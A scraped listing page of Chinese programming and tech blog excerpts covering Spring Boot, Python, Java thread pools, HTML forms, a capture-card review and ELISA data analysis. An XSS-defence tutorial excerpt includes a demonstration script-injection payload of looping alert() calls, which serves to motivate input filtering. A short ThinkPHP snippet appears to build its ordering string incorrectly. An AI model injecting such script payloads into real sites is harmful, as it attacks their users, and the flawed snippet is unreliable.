			前后端分离后端接口开发文档 - 优化更新中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意：该文档正在优化更新，更新内容更加逻辑，具体请查看《前后端分离项目入门开发》专栏
项目名称：ftest测试公开版（博客）
开发日期：2020-11-15
开发者：fnee
环境：工具/IDEAIU | jdk/1.8 | maven/4.0.0 | SpringBoot/2.3.5.RELEASE
系统：Windows/开发
文章目录 一、项目基础搭建1.新建项目2.引入MyBatis-Plus依赖3.修改配置4.添加分页插件5.创建数据库6.生成代码-&gt;测试1 二、项目二层搭建1.统一结果封装2.安装redis（5.0.10）3.Shiro-redis整合&gt;1.配置基础环境&gt;2.添加基础类&gt;3.创建Filter&gt;4.创建授权信息 三、全局异常处理-&gt;测试2 四、实体校验-&gt;测试3 五、跨域问题六、接口开发1.登录2.退出3.博客列表&gt;1.全部&gt;2.按分类&gt;3.最热 4.博客详情5.添加或修改6.总阅读量7.分栏列表8.分栏数量 七、源码下载 一、项目基础搭建 1.新建项目 创建新项目Spring Assistant，基础信息如下
选中添加的依赖spring-boot-devtools，spring-boot-starter-web，lombok，MySQL Drive，如果没有对应的依赖选项，可以先跳过，在项目创建完毕再在pom.xml中添加依赖，Maven依赖资源：https://mvnrepository.com/
2.引入MyBatis-Plus依赖 可以参考官方文档：https://mybatis.plus/guide/
因为我们使用的是Mybatis-plus，所以在pom.xml中添加以下代码，引入MyBatis-Plus依赖，用来自动生成代码，提高开发效率
&lt;!-- mybatis-plus依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.4.0&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 模板 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-freemarker&lt;/artifactId&gt; &lt;version&gt;2.1.3.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 代码生成器 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.4.0&lt;/version&gt; &lt;/dependency&gt; 3.修改配置 将application.properties配置文件改为application.yml，并添加以下代码（注意修改自己的数据库密码）
spring: datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/ftest?useUnicode=true&amp;useSSL=false&amp;characterEncoding=utf8&amp;serverTimezone=Asia/Shanghai username: root password: 这里是你的数据库密码 mybatis-plus: mapper-locations: classpath*:/mapper/**Mapper.xml server: port: 80 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4783a7602a2d7b1b131f9674fabb98c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a56e1e9d00af09aecc7d1a9e7e43fa39/" rel="bookmark">
			python dicom图像分割_python处理DICOM并计算三维模型体积
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		from PIL import Image
import numpy as np
import pydicom
import os
def get_pixels_No(bmp_data_dir):
pixels_No = 0
bmp_files = os.listdir(bmp_data_dir)
for bmp in bmp_files:
bmp_file = os.path.join(bmp_data_dir,bmp)
img = Image.open(bmp_file)
img_array = np.array(img)
# img_array.dtype为布尔类型，需要转换为Int类型，其累加和恰好为体素总和
img_array_int = img_array.astype(int)
pixels_No = pixels_No+img_array_int.sum()
return pixels_No
def get_pixel_info(dcm_data_dir):
pixel_infos = [] dcm_files = os.listdir(dcm_data_dir)
dcm_file_1 = os.path.join(dcm_data_dir,dcm_files[0])
dcm_tag_1 = pydicom.read_file(dcm_file_1)
# 获取像素间距.
spacex, spacey = dcm_tag_1.PixelSpacing
# 获取层间距
# 有些 dcm图像并不是按照InstanceNumber进行排序的，不能直接用最后一张的slicelocation减去第一张，再除以张数
SliceLocations = [] ImagePositon_z = [] for dcm in dcm_files:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a56e1e9d00af09aecc7d1a9e7e43fa39/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d24684e821d586826f32281aeb4f79ef/" rel="bookmark">
			周期性线程池Executors.newScheduledThreadPool
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 newScheduledThreadPool的作用构造方法newScheduledThreadPool常用方法demo周期执行：scheduleAtFixedRate()方法功能：执行Demo：执行结果： 周期执行：scheduleWithFixedDelay()方法功能：执行Demo：执行结果： 延迟执行：schedule()方法功能：执行Demo：执行结果： 延迟执行并返回结果：schedule()方法功能：执行Demo：执行结果： 延迟执行并返回结果：submit()方法功能：执行Demo：执行结果： newScheduledThreadPool的作用 常用于需要延迟执行或周期循环执行任务的场景
构造方法 ScheduledExecutorService java.util.concurrent.Executors.newScheduledThreadPool(int corePoolSize, ThreadFactory threadFactory) 该方法只有两个参数，一个是核心池的大小。另一个是线程工厂。
newScheduledThreadPool常用方法demo 下面的所有的测试demo都使用静态对象，就不重复定义了：
static ScheduledExecutorService pool = Executors.newScheduledThreadPool(5); 周期执行：scheduleAtFixedRate() 方法功能： scheduleAtFixedRate(command, 5, 2, second):
第一次开始执行是5s后，假如执行耗时1s，那么下次开始执行是7s后，再下次开始执行是9s后。
如果执行耗时&gt;等待时间，那么将会在任务执行完成后立马开始执行下一轮任务。
如果执行耗时&lt;等待时间，那么将会在任务执行完成后等待【等待时间-执行耗时】，然后再执行下一轮任务
执行Demo： @Test public void test_scheduleAtFixedRate() throws InterruptedException { System.out.println("scheduleAtFixedRate-start:" + new Date()); // scheduleAtFixedRate(command, 5, 2, second)， // 第一次开始执行是5s后，假如执行耗时1s，那么下次开始执行是7s后，再下次开始执行是9s后 // 如果执行耗时&gt;等待时间，那么将会在任务执行完成后立马开始执行下一轮任务。 // 如果执行耗时&lt;等待时间，那么将会在任务执行完成后等待【等待时间-执行耗时】，然后再执行下一轮任务 pool.scheduleAtFixedRate(() -&gt; { try { Thread.sleep(1000L); } catch (Exception e) { e.printStackTrace(); } System.out.println("scheduleAtFixedRate:" + new Date()); }, 5, 2, TimeUnit.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d24684e821d586826f32281aeb4f79ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1519309f33f2ef9f0f7391381eb4d1b/" rel="bookmark">
			2020-11-24
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 7-8 求误差小于输入值的e的近似值 (20分)
自然常数e可以用级数1+1/1!+1/2!+⋯+1/n!来近似计算。ei代表前i项求和。输入误差范围error,当
ei+1-ei&lt;error,则表示e的近似值满足误差范围。
输入格式: 在一行输入误差范围。
输出格式: 在一行输出e的近似值（保留6位小数）。
输入样例1: 在这里给出一组输入。例如：
0.01 输出样例1: 在这里给出相应的输出。例如：
2.716667 输入样例2: 在这里给出一组输入。例如：
0.000000001 输出样例2: 在这里给出相应的输出。例如：
2.718282 def f(x): s=1 for i in range(1,x+1): s=s*i return 1/s error=float(input()) i=1 while f(i)&gt;=error: i=i+1 ans=sum([f(j) for j in range(0,i+1)]) print("{:.6f}".format(ans)) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b0648305c778eb57d6e6d5141a69552/" rel="bookmark">
			HTML-form表单&#43;iframe
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		form 表单标签 form表单是标签是所有标签最核心标签之一，它是用来实现前后端交互的一个重要标签
常用属性：
name：表单名称
action：表单数据提交的地方（通常是一个后台文件名（.jsp/.php/.asp/.aspx/.py等），或网址）。如果是#，表示提交到当前文件下。
method：前端提交数据到后台的方法，主要有get和post。默认的是get。
用get提交，数据会直接暴露出来，用past不会暴露显示的是action的值 表单元素有：
input类：主要完成输入,选择或发出指令根据不同的type属性，可以变化多种状态输入模式
&lt;input type="text" /&gt; 默认值，单行文本输入框 属性：
placeholder 提示
name 命名
minlength和maxlength 最少/多输入的字符个数
disabled 失效
readonly 只读
value 设置框内默认值
pattern 进行正则匹配 &lt;input type="password" /&gt; 密码框 属性与text一样 &lt;input type="submit" /&gt; 表单数据提交至后台的按钮 属性：
value 按钮的标题
disabled 失效 &lt;input type="image" /&gt; 图片提交按钮，用法与button一样 属性：
src（特殊属性）用来加载提示图片，用它替换了value
disabled 失效
他有提交功能，与submit一样。 &lt;input type="radio" /&gt; 单按钮，通常是两项以上。 属性：
name（必须要有，用来分组的）
value
checked 选中
disabled 失效
readonly 只读 &lt;input type="checkbox" /&gt; 复选框，可以用来选择0项，1项，多项 属性：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b0648305c778eb57d6e6d5141a69552/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/082e0cb694b24ef447b3b9676c2e5c6a/" rel="bookmark">
			没有找到dshow(wdm)系列采集卡_终于支持4K环境：雷蛇 Ripsaw HD锯齿鲶视频采集卡体验...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		视频采集卡一直都是比较小众，但又是部分人群刚需的产品。
它在直播推流和录屏采编方面有自己强大的优势，在不升级其它硬件的情况下可以进行有效减少直播时对资源的占用，而且使用灵活。但市面上成规模的采集卡品牌并不多。而这次雷蛇也更新了自己直播产品线，新增了Ripsaw HD，也就是新款锯齿鲶。
2018整年，一直都想从0开始搭建一套雷蛇桌面，甚至一度接近完成。
▼ 雷蛇给我的感觉就是：主线上有一段时期比较疲软，直到有了猎魂光蛛精英版。
但是在支线上一直在出新，NABU手环都有了，真怕哪天Min开发布会说要做Razer的RGB汽车，之前的汽车都是古时代的设计云云。
▼ 期间也考虑过雷蛇的直播系统，毕竟一款驱动调度所有外设所带来的体验肯定比拼凑起来的要好很多。
在大家都在追求品牌全家桶的当下，一直没有更新雷蛇的直播系统原因就在于：Razer的直播系统里少了最关键的一环：高清视频采集卡。
▼ 老款的锯齿鲶真的到了寿命的终点，尤其是4K分辨率下无法内录的问题。对于一个双4K显示器的渣渣来说，关闭Nvidia Surround，左右两块屏幕的分辨率不同真的很影响体验。
▼ 可能是雷蛇看到了老款锯齿鲶鱼的局限性，2019年雷蛇推出了Ripsaw HD锯齿鲶，定位于1080P 60Hz传输，也就是目前国内主流直播网站推流的峰值。
▼ 同时新款锯齿鲶HD支持4K环境，当我们在4K环境下进行直播时， Ripsaw HD也可以进行推流。
而1080P输出的Ripsaw HD锯齿鲶，确实较符合目前的直播环境——毕竟1080P分辨率的显示器已经逐渐被2K及以上的屏幕所取代。4K屏幕已经普及开来，尤其是游戏主播，4K屏肯定是标配。
如果推流分辨率/码率再高一些，就对本身的上行宽带提出更严苛的要求，可以说1080P@60Hz是目前比较理想的解决方案。
包装与配件： ▼ Ripsaw HD锯齿鲶的包装依旧延续了雷蛇经典的黑绿家族化配色，非常有辨识度——其实每个品牌都有自己一脉相承的包装风格，雷蛇也不例外。
▼ 新的LOGO一改此前的手写泼溅风格，字体变得更加有科技感，雷蛇也确实是一个有耐心去做这些细节的品牌，之前网上还有雷蛇的字体包(运用在早期黑寡妇上的字符)。
▼ 打开包装盒后可以看到白色的信笺(来自Min-Tan)，这个赠品延续了很多年，这也是很多人觉得开箱雷蛇配件比较有仪式感的原因：
▼ 取出信笺，被固定在黑色海绵正中的就是Razer Ripsaw锯齿鲶HD：
▼ 从这个角度看有种打开新款Blade 包装的感觉：
▼ 主配件包括Ripsaw锯齿鲶HD、说明书、信笺和数据线包：
▼ 连接线方面包括一根HDMI线、一根3.5mm音频线、和一跟USB-A To C，长度均为两米，可以满足桌面用户的连接需求：
▼ 依旧有橡胶搭扣：
▼ 两根线材均打上了雷蛇的LOGO，犹记得Min说过，世界上只有两个品牌的用户会把品牌的LOGO贴在身上，一个是Apple，一个就是Razer。
先不说真假，看Min那么认真就可以看出Razer确实重视品牌建设和粉丝效应，能打标的位置肯定要安排上：
▼ 相比其它视频采集卡，Ripsaw锯齿鲶的特点是：外观做成了非常规矩的长方体，相比老款的锯齿鲶，新款无疑要更加美观：
并没有往特别个性化的方向走，联想起Razer Blade13后也就释然了，这是由品牌基因决定的：
▼ 单面为HDMI×2+Type-C×1，IN口链接独立显卡，OUT口连接显示器，Type-C口连接主机起到数据交互的作用：
▼ Ripsaw HD没有采用DP接口更多的应该是出于兼容性的考虑，我看到的一些早几年的专业设计师显示器上很多都没有DP接口，但依旧价格高企。
▼ 另一面为3.5mm音频接口，可以连接麦克风和和耳机，当然也可以让音频设备直连主机。
▼ Ripsaw HD背面是大面积的橡胶防滑贴，以保证在桌面的稳固运行：
▼ Ripsaw HD的底部细节：
▼ 视觉效果上，Ripsaw HD整体为矩形，但在边角上做了圆角处理，不会有硌手的感觉：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/082e0cb694b24ef447b3b9676c2e5c6a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a7664886e2c991aa40270a5d10f64d6/" rel="bookmark">
			高德地图天气图标符号大全_@CS85车主，你们要的最新高德地图，来了！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 继上次CS75PLUS OTA升级之后
众多车主朋友们强烈要求增加“高德地图”
大家的呼声，小安都收到了
这就用行动回应各位的需求
OTA升级正在酝酿中
首先就为咱们CS85车主安排上了
一起来先睹为快吧！
---------------------------------------------------------
本次升级仅针对于：CS85 2.0T 型版、2.0T 动版、2.0T 品版、2.0T 智版、1.5T 品版(因为CS85的其他车型已经有高德地图了哦~)升级后有高德地图~
全新OTA升级之后
您将可以在车机上使用高德地图
在之前已有的腾讯地图之外
多了一个导航选择
今后，在选择路线时
你将可以比较两个软件来择优选择
对平时习惯使用高德地图的朋友来说
界面操作更加熟悉和友好
【双地图】就是这么巴适！
tips：界面主题不同，地图图标位置不同，如上图红色主题腾讯地图图标在第二页；车主可根据自己使用爱好调节图标位置。
如果车机未收到高德地图升级提示。请在长安FAN-服务-问工程师-反馈问题，或在inCall APP发现本文下留言，我们会有专门的同事为您解决。反馈格式举例：CS85 2.0T 型版车主未收到高德地图升级包+vin码(挡风玻璃左下角的数字)。
活动时间2020年7月24日 至 2020年7月31日 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aaa8e1a1d5c4ebfd7caa89a7e56f9031/" rel="bookmark">
			python删除字符串中重复字符_从Python中删除字符串标点符号的最佳方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		似乎有一个比以下更简单的方法：
1
2
3import string
s ="string. With. Punctuation?" # Sample string
out = s.translate(string.maketrans("",""), string.punctuation)
有？
在我看来很直接。你为什么要改变它？如果你想更容易的话，就把你刚才写的东西包装在一个函数中。
好吧，用str.translate的副作用来做这项工作，似乎有点刻薄。我在想可能有一些更像str.strip(chars)的东西可以处理整个字符串，而不仅仅是我错过的边界。
也取决于数据。在服务器名称中包含下划线的数据(在某些地方很常见)上使用这个命令可能会很糟糕。只要确保你知道数据，知道它是什么，或者你可以以clbuttic问题的一个子集结束。
也取决于你所说的标点符号。"The temperature in the O'Reilly &amp; Arbuthnot-Smythe server's main rack is 40.5 degrees.只包含一个标点符号，第二个。
我很惊讶没有人提到string.punctuation根本不包括非英语标点符号。我在想。，！？：&amp;215；""？等等。
不适用于Unicode字符串？
@约翰马钦，你忘了' '是标点符号。
从效率的角度看，你不会打败
1s.translate(None, string.punctuation)
对于较高版本的python，请使用以下代码：
1s.translate(str.maketrans('', '', string.punctuation))
它使用一个查找表在C中执行原始字符串操作——除了编写自己的C代码，没有什么比这更好的了。
如果速度不是问题，另一个选择是：
1
2exclude = set(string.punctuation)
s = ''.join(ch for ch in s if ch not in exclude)
这比s.replace替换为每个字符要快，但不能像下面计时中看到的那样执行非纯Python方法，如regexes或string.translate。对于这种类型的问题，在尽可能低的水平上做它会有回报。
定时代码：
1
2
3
4
5
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aaa8e1a1d5c4ebfd7caa89a7e56f9031/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02cc2f187eea6c150762427ae14fb3c1/" rel="bookmark">
			python函数参数顺序_Python 列表sort()添加key和reverse参数操作方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文是关于Python 列表sort()添加key和reverse参数操作方法介绍，之前python sorted 倒序法在前面文章有中简单介绍过，sort()是python列表排序方法，除了列表cmp()比较函数可以做为参数放在sort()，key和reverse更是经常用到的sort方法另外两个可选参数。使用时要通过关键字参数，也就是名字来指定。
先来讲下key在sort()函数中的作用，key和cmp参数一样，使用时都需要提供可以做为排序依据的函数。比如说我们有一个列表，要以列表内元素的长度来排序，那么就需要用到计算长度的len()函数：
&gt;&gt;&gt; x = ['hello','abc','iplaypython.com']
&gt;&gt;&gt; x.sort(key=len)
&gt;&gt;&gt; x
['abc', 'hello', 'iplaypython.com']
当然做为key排序依据的函数，不仅仅是len，只要按照你的需求写入对应的函数就可以。假如需要以整型数字来排序，就需要用到int：
&gt;&gt;&gt; a = ['3','188','50','1225']
&gt;&gt;&gt; a.sort(key=int)
&gt;&gt;&gt; a
['3', '50', '188', '1225']
sort()还有另外一个关键字参数，就是reverse，它是一个布尔值True/False，作用是用来决定是否要对列表进行反向排序。
&gt;&gt;&gt; a.sort(key=int,reverse=True)
&gt;&gt;&gt; a
['1225', '188', '50', '3']
列表sort()添加key和reverse参数操作方法很简单，也可以同样应用到python sorted 倒序函数中。key()和reverse()也可以同时做为参数添加到sort方法中，能帮助实现更多效果。
玩蛇网文章，转载请注明出处和文章网址：https://www.iplaypy.com/jinjie/jj155.html
相关文章 Recommend
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2238bfeeb952b47677f2e21b38af6f9/" rel="bookmark">
			Thinkphp6 查询结果按in集合顺序显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 use think\Db; $in = ['张三', '李四', '王五']; $order= 'field(name, '.$in.')'; return User::whereIn('name',$in)-&gt;order(Db::raw($order))-&gt;select(); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02f931b4a26a964ba188dc8f321bb786/" rel="bookmark">
			python列表获取元素_python如何读取列表中元素的位置？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python读取列表中元素位置的方法：
1、使用index()方法获取列表中指定元素的位置
index()方法语法：str.index(str, beg=0, end=len(string))
参数
str -- 指定检索的字符串
beg -- 开始索引，默认为0。
end -- 结束索引，默认为字符串的长度。
返回值
如果包含子字符串返回开始的索引值，否则抛出异常。
示例：#!/usr/bin/python
str1 = "this is string example....wow!!!";
str2 = "exam";
print str1.index(str2);
print str1.index(str2, 10);
print str1.index(str2, 40);
输出结果如下：15
15
Traceback (most recent call last):
File "test.py", line 8, in
print str1.index(str2, 40);
ValueError: substring not found
shell returned 1
2、使用enumerate()方法获取所有元素及位置
enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。
示例：numbers = [10, 29, 30, 41]
for index, value in enumerate(numbers):
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02f931b4a26a964ba188dc8f321bb786/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91ed3c0c2dcfa7ae8f8647590d2923e6/" rel="bookmark">
			python 系统管理_Python学生管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python学生管理系统
功能
学生信息录入
学生成绩查询
查找学生信息
录入学生成绩
课程平均值
所有学生信息
工具
JetBrains PyCharm 2019.1.3
效果展示图
欢迎界面图
学生信息录入
斜体样式
查找学生信息
录入学生信息
课程平均值
所有学生信息
退出系统
结构分析
Python代码
studentmanagementsystem模块
import tools
def main():
"""主函数"""
while True:
# 显示功能菜单
tools.show_menu()
action_str = input('\033[1;31m%s\033[0m' % '您希望选择执行的操作:')
print('\033[1;31m%s\033[0m' % "您选择的操作是:【%s】" % action_str)
# 针对名片的操作
if action_str in ["1", "2", "3", "4", "5", "6"]:
if action_str == "1":
tools.informationinput_card()
elif action_str == "2":
tools.searchscore_card()
elif action_str == "3":
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91ed3c0c2dcfa7ae8f8647590d2923e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20f4d7fbf5d648415980356305eeca5e/" rel="bookmark">
			python xlwt_python 中 xlwt 操作excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python中使用xlwt操作excel非常方,和Java使用调框架apache poi相比这就是天堂啊
一.安装xlwt模块
pip3 install xlwt
二.简单使用xlwt
import xlwt #导入模块
workbook = xlwt.Workbook(encoding='utf-8') #创建workbook 对象
worksheet = workbook.add_sheet('sheet1') #创建工作表sheet
worksheet.write(0, 0, 'hello') #往表中写内容,第一各参数 行,第二个参数列,第三个参数内容
workbook.save('students.xls') #保存表为students.xls
#在Java中使用poi操作excel 在创建workbook对象的时候就需要写好表名,创建workbook对象完成后
#这个表就已经存在,但是使用xlwt 需要在最后调用保存的时候为表命名,并且只有调入save方法后才会#创建表
三.为内容设置style
workbook = xlwt.Workbook(encoding='utf-8')
worksheet = workbook.add_sheet('sheet1')
#设置字体样式
font = xlwt.Font()
#字体
font.name = 'Time New Roman'
#加粗
font.bold = True
#下划线
font.underline = True
#斜体
font.italic = True
#创建style
style = xlwt.XFStyle()
style.font = font
#根据样式创建workbook
worksheet.write(0, 1, 'world', style)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20f4d7fbf5d648415980356305eeca5e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/796c578e0b9927e4d4ef6056b528673b/" rel="bookmark">
			【完整源码在文末】Springboot如何启动XSS防御？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		“ XSS 攻击全称跨站脚本攻击，是为不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS，XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到提供给其它用户使用的页面中。
” 你可以自己做个简单尝试：
1. 在任何一个表单内，你输入一段简单的 js 代码：&lt;script&gt;for(var i=0;i&lt;1000;i++){alert("弹死你"+i);}&lt;/script&gt;，将其存入数据库；
2. 在页面上一个 div 元素内直接展示第一步内存入的值，你会发现弹出框出现了；
以上 XSS 攻击只算一个小恶作剧，但如果这玩意被发到了网站的首页上，我估计老板一定会因为频繁的投诉而和你来场愉快的谈话…
以上两个示例仅仅算是恶作剧，恶意用户能做的更多，如获取用户信息，进行 “网络钓鱼” 攻击等。
应对 XSS 攻击的其中一个方式就是后端对输入内容进行过滤，输入内容里面的敏感信息直接过滤，如&lt;script&gt;标签等，以下来说明如何在 spring boot 项目内方便快捷的实现 XSS 过滤。
1、Jsoup 组件 Jsoup 使用标签白名单的机制用来进行防止 XSS 攻击, 假设白名单中只允许 p 标签存在, 此时在一段 HTML 代码中, 只能存在 p 标签 , 其他标签将会被清除只保留被标签所包裹的内容，因此使用 Jsoup 组件来进行内容过滤。
添加 maven 依赖：
&lt;!-- xss过滤组件 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.jsoup&lt;/groupId&gt; &lt;artifactId&gt;jsoup&lt;/artifactId&gt; &lt;version&gt;1.9.2&lt;/version&gt; &lt;/dependency&gt; JsoupUtil 提供基于 Jsoup 过滤非法标签的工具类：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/796c578e0b9927e4d4ef6056b528673b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfe291508eb5790df950c698c85893d9/" rel="bookmark">
			Android 接收系统广播 动态注册监听网络变化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目完整代码
https://github.com/Phil-tom/Android-The-First-Line-of-Code/tree/main/Chapter5/BroadcastTest
Android内置了很多系统级别的广播，我们可以在应用程序中通过监听这些广播来得到各种系统的状态信息。
动态注册监听网络变化 广播接收器可以自由地对自己感兴趣的广播进行注册，这样当有相应的广播发出时，广播接收器就能够接收到该广播，并在内部处理相应的逻辑。
注册广播的方式有两种：
(1)在代码中注册（动态注册）
(2)在AndroidManifest.xml中注册（静态注册）
创建广播接收器：新建一个类，让它继承自BroadcastReceiver，并重写父类的onReceive()就可以。当有广播到来时，onReceive()方法就会得到执行
目前正在学习《第一行代码Android(第二版)》的同学们注意
书上说是在程序运行一开始，会弹出消息框，这是对的，但是之后说去修改Data usage中的Cellular data按钮就可以看到变化情况，我使用的虚拟设备是Nexus 5X API 28。
如果你也是这个虚拟设备，想要看到变化情况需要先检查你的虚拟设备有没有连上WIFI，有的话你可调整WIFI的开关按钮；如果没有连上WIFI，则可以通过调整Mobile Network中的Mobile data来看到相应的提示框。
方式一 public class MainActivity extends AppCompatActivity { private IntentFilter intentFilter; private NetworkChangeReceiver networkChangeReceiver; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); intentFilter = new IntentFilter(); intentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE"); networkChangeReceiver = new NetworkChangeReceiver(); registerReceiver(networkChangeReceiver, intentFilter); } @Override protected void onDestroy() { super.onDestroy(); unregisterReceiver(networkChangeReceiver); } class NetworkChangeReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { //方式一 Toast.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfe291508eb5790df950c698c85893d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ff2b60d320938095e50d7b02feb474c/" rel="bookmark">
			od找数据 遇到dll_ELISA实战案例分享——数据处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前的几期课堂讲座给大家分享了ELISA实验的原理，操作步骤以及实验中的常见问题（感兴趣的小伙伴可以去视频专区收看），近期又收到部分小伙伴的反馈问题，主要集中在数据处理上。小编看了也觉得比较可惜，整个ELISA实验做得不错，可惜在最后的数据处理上犯了错误，直接导致实验结果出了大问题，可谓功亏一篑。接下跟着小编进行一次实战案例的分析，详细了解一下爱必信ELISA试剂盒的数据处理过程吧~
话不多说，先上图：
图一. 客户提供原始OD值图（涉及未发表数据，部分隐去，部分略作处理） 图二. 客户处理的标准曲线图 客户反馈，部分数据OD出现负值，无法处理，觉得试剂盒有问题。小编接到这个case之后，简单的看了一下客户的数据，就发现几个明显的数据处理问题，而根据客户的原始OD数据，初步判断，试剂盒是正常的，并且实验数据还比较可靠。不知道是否有聪明的小伙伴已经从这个数据中发现了问题呢？没关系，跟着小编一起来抽丝剥茧的详细分析一下吧~1. OD值出现负值
大量样品孔的读值为负数，但接近零点，小编看了一下客户标曲的0点OD值接近0，初步判断客户是用空白孔进行校准，但空白孔由于操作污染等原因，OD值偏高，进而导致样品孔OD值为负。跟客户沟通之后，确实是进行了空白孔校准。
沟通之后，确认原始空白孔读值为0.0962，明显偏高，正常OD450的空白孔读值应为0.06左右。
在这里，小编建议有条件的小伙伴，尽量要用我们推荐的双波长校正法，使用570或630nm波长进行校正，OD450 - OD570/630即为校正后的OD值，可直接用于计算，也可根据数据质量，再进行空白校正。如没有双波长的酶标仪，读取OD450数据后，应先判断数据质量，再进行空白校正。
小编将空白校正进行补回，得到的OD450原始数据如下：至此，样品孔数据出现负值这一问题解决。
图三. 经还原处理的OD450原始数据图 2. 标曲拟合问题
处理完了负值问题，还有一个很明显的问题就是，客户的标曲拟合问题。我们这款试剂盒（Mouse TNF alpha ELISA Kit，abs520010）标曲最高点是2000 pg/ml，客户给我的截图（图二）只到250 pg/ml，再仔细研究一下，发现客户的拟合方式用的竟然是直线拟合。跟客户沟通之后，确认原因，客户选择直线拟合，高点不符合拟合方式，R2值过低，所以客户自己把上面高浓度的点去掉了，只选取到250 pg/ml，进行直线拟合。在这里，小编强调一下， 爱必信ELISA试剂盒推荐拟合方式为四参数拟合，四参数拟合，四参数拟合，重要的事情说三遍。不要再用其他稀奇古怪的拟合方式进行拟合啦。就像这个客户犯的错误，虽然看似250 pg/ml以下的点可以用直线拟合，但是表达含量较高的样品，OD值高时，就不符合他拟合的这条直线了，会导致结果出现严重偏差。由于0孔出现问题，小编在拟合标曲时，将OD值最低的孔作为空白孔，TNF-α在正常样品中表达含量极低，可视为0，拟合曲线如下：
图四. 四参数拟合的曲线图及方程 回归计算之后得到样品浓度，部分无法计算出的样品孔，表达含量低于0点，按0计算即可。本期ELISA实战案例解析就到这里了，希望对各位小伙伴们有所帮助。大家在平时的实验中遇到什么问题也可以联系我们，小编汇总之后，尽力为大家解答~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
